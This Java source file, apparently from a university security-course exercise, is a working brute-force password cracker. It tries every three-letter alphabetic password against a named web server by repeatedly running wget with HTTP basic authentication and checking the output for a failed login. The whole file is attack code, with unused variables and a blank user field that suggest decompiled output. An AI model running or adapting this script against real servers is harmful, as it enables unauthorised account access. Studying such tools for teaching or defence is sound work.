import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
public class BruteForce {
    public static void main ( final String[] array ) {
        final String s = new String();
        System.out.println ( "Password is: " + m00() );
    }
    public static String m00() {
        final String s = new String();
        final char[] charArray = "AAA".toCharArray();
        final Runtime runtime = Runtime.getRuntime();
        System.out.println ( " attacking....." );
        for ( int i = 65; i <= 122; ++i ) {
            charArray[0] = ( char ) i;
            for ( int j = 65; j <= 122; ++j ) {
                charArray[1] = ( char ) j;
                for ( int k = 65; k <= 122; ++k ) {
                    charArray[2] = ( char ) k;
                    final String s2 = new String ( charArray );
                    final String string = "wget --http-user= --http-passwd=" + s2 + " http://sec-crack.cs.rmit.edu./SEC/2/index.php ";
                    try {
                        final BufferedReader bufferedReader = new BufferedReader ( new InputStreamReader ( runtime.exec ( string ).getErrorStream() ) );
                        int n = 1;
                        if ( bufferedReader.readLine() != null ) {
                            String line;
                            while ( ( line = bufferedReader.readLine() ) != null ) {
                                if ( line.endsWith ( "Required" ) ) {
                                    n = 0;
                                }
                            }
                            if ( n == 1 ) {
                                return s2;
                            }
                        }
                    } catch ( Exception ex ) {
                        ex.getMessage();
                    }
                    if ( k == 90 ) {
                        k = 96;
                    }
                    runtime.gc();
                }
                if ( j == 90 ) {
                    j = 96;
                }
            }
            if ( i == 90 ) {
                i = 96;
            }
        }
        return "not found";
    }
}
